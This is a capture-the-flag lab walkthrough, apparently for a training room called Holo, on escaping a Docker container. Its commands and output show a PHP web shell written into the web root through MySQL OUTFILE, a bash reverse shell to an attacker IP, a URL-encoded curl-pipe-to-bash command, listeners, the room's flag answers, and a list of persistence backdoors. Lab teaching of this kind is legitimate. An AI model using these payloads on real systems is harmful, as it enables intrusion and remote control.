Now that you have identified that you are in a container and have performed all the information gathering and situational awareness you can, you can escape the container by exploiting the remote database.
There are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.
For more information about container best practices and docker security, check out this OWASP cheat-sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html).
A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, [CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/). It can also be beneficial to use a container enumeration script such as DEEPCE, [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce).
Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.
The basic methodology for exploiting MySQL can be found below.
-   Access the remote database using administrator credentials
-   Create a new table in the main database
-   Inject PHP code to gain command execution
Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`
-   Drop table contents onto a file the user can access
-   Execute and obtain RCE on the host.
Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.
We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.
Command used: `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`
Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.
Example usage: `curl 127.0.0.1:8080/shell.php?cmd=whoami`
Answer the questions below
```sql
mysql> show grants for admin;
show grants for admin;
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for admin@%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, CREATE ROLE, DROP ROLE ON *.* TO `admin`@`%`                                                                                                                                               |
| GRANT APPLICATION_PASSWORD_ADMIN,AUDIT_ADMIN,BACKUP_ADMIN,BINLOG_ADMIN,BINLOG_ENCRYPTION_ADMIN,CLONE_ADMIN,CONNECTION_ADMIN,ENCRYPTION_KEY_ADMIN,GROUP_REPLICATION_ADMIN,INNODB_REDO_LOG_ARCHIVE,INNODB_REDO_LOG_ENABLE,PERSIST_RO_VARIABLES_ADMIN,REPLICATION_APPLIER,REPLICATION_SLAVE_ADMIN,RESOURCE_GROUP_ADMIN,RESOURCE_GROUP_USER,ROLE_ADMIN,SERVICE_CONNECTION_ADMIN,SESSION_VARIABLES_ADMIN,SET_USER_ID,SHOW_ROUTINE,SYSTEM_USER,SYSTEM_VARIABLES_ADMIN,TABLE_ENCRYPTION_ADMIN,XA_RECOVER_ADMIN ON *.* TO `admin`@`%` |
| GRANT ALL PRIVILEGES ON `DashboardDB`.* TO `admin`@`%`                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
3 rows in set (0.00 sec)

mysql> CREATE TABLE hacker ( hacker varchar(255) );
CREATE TABLE hacker ( hacker varchar(255) );
Query OK, 0 rows affected (0.03 sec)

mysql> INSERT INTO hacker (hacker) VALUES ('<?php $cmd=$_GET["cmd"];system($cmd);?>');
INSERT INTO hacker (hacker) VALUES ('<?php $cmd=$_GET["cmd"];system($cmd);?>');
Query OK, 1 row affected (0.00 sec)

mysql> SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
Query OK, 1 row affected (0.00 sec)

mysql> exit
exit
Bye

www-data@2e332f92060f:/var/www/admin$ curl 192.168.100.1:8080/shell.php?cmd=whoami
mirl 192.168.100.1:8080/shell.php?cmd=whoam
www-data
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ nano rev.sh
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.50.104.206/5555 0>&1

curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.104.206:8000/rev.sh|bash &'

url encode

curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'

revshell (scaping docker)

www-data@2e332f92060f:/var/www/admin$ curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'
cmd=curl%20http%3A%2F%2F10.50.104.206%3A8000%2Frev.sh%7Cbash%20%26'
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.200.108.33 - - [31/Jan/2023 21:39:52] "GET /rev.sh HTTP/1.1" 200 -
```
```sql
┌──(kali㉿kali)-[~/Holo]
└─$ rlwrap nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.200.108.33.
Ncat: Connection from 10.200.108.33:57674.
bash: cannot set terminal process group (2176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-200-108-33:/var/www/html$ whoami
whoami
www-data

www-data@ip-10-200-108-33:/var/www$ cat user.txt
cat user.txt
HOLO{3792d7d80c4dcabb8a533afddf06f666}
```
Read the above and exploit the database.
Completed
What user is the database running as?
*www-data*
### Docker Breakout Going%20out%20with%20a%20SHEBANG%21
Now that you have escaped the container and have RCE on the host, you need to create a reverse shell and obtain a way to gain a stable shell onto the box.
There are several ways to obtain a reverse shell on a box once you have RCE. Outlined below are a few of the most common methods used.
-   netcat
-   bash
-   python
-   perl
For more information about various payloads and reverse shells, you can use check out these two resources. [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
In this task, we will be covering how to use a basic bash reverse shell along with URL encoding to drop a script directly into bash. Using URL encoding to our advantage, we can ease much pain when executing a payload as often special characters such as `&, ', !, ;, ?` will cause serious issues.
To begin, we will create a simple payload by placing the below code into a `.sh` file.
`#!/bin/bash   bash -i >& /dev/tcp/tun0ip/53 0>&1`
The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).
Now that you have the payload ready to go, you can start up a local web server on your attacking machine using either _http.server_ or _updog_ or _php_. You can find example usage for all three below.
-   `python3 -m http.server 80`
-   `updog`
-   `php -S 0.0.0.0:80`
Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.
Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`
As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.
Encoded command: `curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26`
The above command is entirely ready to go. You will only need to change the IP address and the file name within the command; this does not require you to change any of the URL encoding present.
You can now start a listener using Netcat or Metasploit to catch your reverse shell once executed. Find commands below to start listeners.
-   `nc -lvnp 53`
-   `use exploit/multi/handler`
Now that you have the full payload and execution command ready, you can use it and the RCE to gain a shell onto the box. Find the full command below.
Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.x.x.x%3A80%2Fshellscript.sh%7Cbash%20%26'`
Answer the questions below
Obtain a shell on L-SRV01 and submit the user flag on Task 4.
*HOLO{3792d7d80c4dcabb8a533afddf06f666}*
Now that we have gained a decent foothold onto the network and have a stable shell, we can worry about setting up persistence so that we don't lose our foothold and gain our foothold again if the machine is reset or our shell gets terminated. There are many methods for persistence outlined below are a few examples.
-   LD_PRELOAD
-   Backdoored binaries
-   PAM backdoor
-   SSH keys
-   Malicious services
-   Cronjob
